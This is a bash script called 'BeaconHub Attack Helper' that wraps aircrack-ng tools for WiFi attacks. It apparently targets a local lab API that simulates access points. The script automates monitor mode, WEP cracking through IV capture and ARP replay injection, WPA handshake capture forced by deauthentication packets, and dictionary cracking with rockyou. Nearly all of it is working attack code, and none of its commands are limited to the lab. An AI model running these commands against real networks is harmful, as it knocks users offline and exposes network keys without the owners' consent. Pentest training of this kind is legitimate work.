#!/bin/bash
# ─────────────────────────────────────────────────────────────────────────────
# BeaconHub Attack Helper
# Quick commands for WiFi pentesting
# ─────────────────────────────────────────────────────────────────────────────

API="http://localhost:8000/api"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║           BeaconHub Attack Helper                             ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

list_aps() {
    echo -e "${GREEN}[*] Active Access Points:${NC}"
    curl -s "$API/ap" | python3 -c "
import sys, json
aps = json.load(sys.stdin)
if not aps:
    print('  No APs running. Create one first.')
else:
    for ap in aps:
        sec = ap['security'].upper()
        clients = ap.get('clients_connected', 0)
        print(f\"  [{ap['id']}] {ap['ssid']} ({sec}) - {ap['bssid']} CH:{ap['channel']} - {clients} clients\")
"
}

list_adapters() {
    echo -e "${GREEN}[*] Available Adapters for Monitor Mode:${NC}"
    curl -s "$API/adapters" | python3 -c "
import sys, json
adapters = json.load(sys.stdin)
free = [a for a in adapters if not a['in_use']]
if not free:
    print('  No free adapters available.')
else:
    for a in free:
        print(f\"  {a['interface']} ({a['phy']}) - {a['mac_address']}\")
"
}

start_monitor() {
    local iface=$1
    if [ -z "$iface" ]; then
        echo -e "${RED}Usage: attack monitor <interface>${NC}"
        list_adapters
        return 1
    fi
    
    echo -e "${YELLOW}[*] Putting $iface into monitor mode...${NC}"
    sudo airmon-ng start "$iface" 2>/dev/null
    
    # Check if monitor interface was created
    if ip link show "${iface}mon" &>/dev/null; then
        echo -e "${GREEN}[+] Monitor mode: ${iface}mon${NC}"
    elif ip link show "$iface" &>/dev/null; then
        echo -e "${GREEN}[+] Interface ready: $iface${NC}"
    fi
}

flood_ap() {
    local ap_id=$1
    if [ -z "$ap_id" ]; then
        echo -e "${RED}Usage: attack flood <ap_id>${NC}"
        list_aps
        return 1
    fi
    
    echo -e "${YELLOW}[*] Starting aggressive traffic flood on AP $ap_id...${NC}"
    result=$(curl -s -X POST "$API/ap/$ap_id/flood-traffic")
    echo "$result" | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    print(f\"  {r.get('message', 'Unknown response')}\")
    if 'hint' in r:
        print(f\"  Hint: {r['hint']}\")
except:
    print('  Error parsing response')
"
}

wep_crack() {
    local bssid=$1
    local channel=$2
    local iface=$3
    
    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        echo -e "${RED}Usage: attack wep <bssid> <channel> [interface]${NC}"
        echo ""
        echo "Steps for WEP cracking:"
        echo "  1. Start monitor mode: attack monitor wlan1"
        echo "  2. Find target with:    sudo airodump-ng wlan1mon"
        echo "  3. Run:                 attack wep <bssid> <channel> wlan1mon"
        echo ""
        list_aps
        return 1
    fi
    
    iface=${iface:-wlan1mon}
    
    echo -e "${GREEN}[*] WEP Attack Setup${NC}"
    echo "  Target BSSID: $bssid"
    echo "  Channel: $channel"
    echo "  Interface: $iface"
    echo ""
    
    # Create output directory
    mkdir -p /tmp/wep_crack
    
    echo -e "${YELLOW}[*] Starting airodump-ng to capture IVs...${NC}"
    echo "  Output: /tmp/wep_crack/capture"
    echo ""
    echo -e "${BLUE}In another terminal, run for faster IV collection:${NC}"
    echo "  sudo aireplay-ng -3 -b $bssid $iface"
    echo ""
    echo -e "${YELLOW}Press Ctrl+C when you have enough IVs (10,000+ for 64-bit, 40,000+ for 128-bit)${NC}"
    echo ""
    
    sudo airodump-ng -c "$channel" --bssid "$bssid" -w /tmp/wep_crack/capture "$iface"
    
    echo ""
    echo -e "${GREEN}[*] Starting aircrack-ng...${NC}"
    sudo aircrack-ng /tmp/wep_crack/capture-01.cap
}

wpa_handshake() {
    local bssid=$1
    local channel=$2
    local iface=$3
    
    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        echo -e "${RED}Usage: attack wpa <bssid> <channel> [interface]${NC}"
        echo ""
        list_aps
        return 1
    fi
    
    iface=${iface:-wlan1mon}
    
    echo -e "${GREEN}[*] WPA Handshake Capture${NC}"
    echo "  Target BSSID: $bssid"
    echo "  Channel: $channel"
    echo "  Interface: $iface"
    echo ""
    
    mkdir -p /tmp/wpa_crack
    
    echo -e "${YELLOW}[*] Starting capture...${NC}"
    echo "  Output: /tmp/wpa_crack/handshake"
    echo ""
    echo -e "${BLUE}In another terminal, deauth clients to force handshake:${NC}"
    echo "  sudo aireplay-ng -0 5 -a $bssid $iface"
    echo ""
    echo -e "${YELLOW}Wait for 'WPA handshake: $bssid' message${NC}"
    echo ""
    
    sudo airodump-ng -c "$channel" --bssid "$bssid" -w /tmp/wpa_crack/handshake "$iface"
}

crack_handshake() {
    local capfile=$1
    local wordlist=$2
    
    if [ -z "$capfile" ]; then
        capfile="/tmp/wpa_crack/handshake-01.cap"
    fi
    
    if [ -z "$wordlist" ]; then
        wordlist="/usr/share/wordlists/rockyou.txt"
        if [ ! -f "$wordlist" ]; then
            wordlist="/opt/tools/wordlists/common.txt"
        fi
    fi
    
    if [ ! -f "$capfile" ]; then
        echo -e "${RED}Capture file not found: $capfile${NC}"
        echo "Run 'attack wpa' first to capture a handshake"
        return 1
    fi
    
    echo -e "${GREEN}[*] Cracking WPA handshake...${NC}"
    echo "  Capture: $capfile"
    echo "  Wordlist: $wordlist"
    echo ""
    
    if [ -f "$wordlist" ]; then
        sudo aircrack-ng -w "$wordlist" "$capfile"
    else
        echo -e "${YELLOW}No wordlist found. Using aircrack-ng without wordlist:${NC}"
        sudo aircrack-ng "$capfile"
    fi
}

deauth() {
    local bssid=$1
    local iface=$2
    local count=${3:-10}
    
    if [ -z "$bssid" ]; then
        echo -e "${RED}Usage: attack deauth <bssid> [interface] [count]${NC}"
        echo ""
        list_aps
        return 1
    fi
    
    iface=${iface:-wlan1mon}
    
    echo -e "${YELLOW}[*] Sending $count deauth packets to $bssid...${NC}"
    sudo aireplay-ng -0 "$count" -a "$bssid" "$iface"
}

usage() {
    print_banner
    echo "Usage: attack <command> [options]"
    echo ""
    echo "Commands:"
    echo "  list              List active APs and their details"
    echo "  adapters          List available adapters for attacks"
    echo "  monitor <iface>   Put interface into monitor mode"
    echo "  flood <ap_id>     Start aggressive traffic flood (for WEP IVs)"
    echo "  wep <bssid> <ch>  Start WEP cracking attack"
    echo "  wpa <bssid> <ch>  Capture WPA handshake"
    echo "  crack [capfile]   Crack captured WPA handshake"
    echo "  deauth <bssid>    Send deauth packets"
    echo ""
    echo "Quick Start:"
    echo "  1. attack list                    # See available targets"
    echo "  2. attack monitor wlan1           # Enable monitor mode"
    echo "  3. attack wep AA:BB:CC:DD:EE:FF 6 # Attack WEP network"
    echo ""
}

# Main
case "$1" in
    list)
        list_aps
        ;;
    adapters)
        list_adapters
        ;;
    monitor)
        start_monitor "$2"
        ;;
    flood)
        flood_ap "$2"
        ;;
    wep)
        wep_crack "$2" "$3" "$4"
        ;;
    wpa)
        wpa_handshake "$2" "$3" "$4"
        ;;
    crack)
        crack_handshake "$2" "$3"
        ;;
    deauth)
        deauth "$2" "$3" "$4"
        ;;
    *)
        usage
        ;;
esac
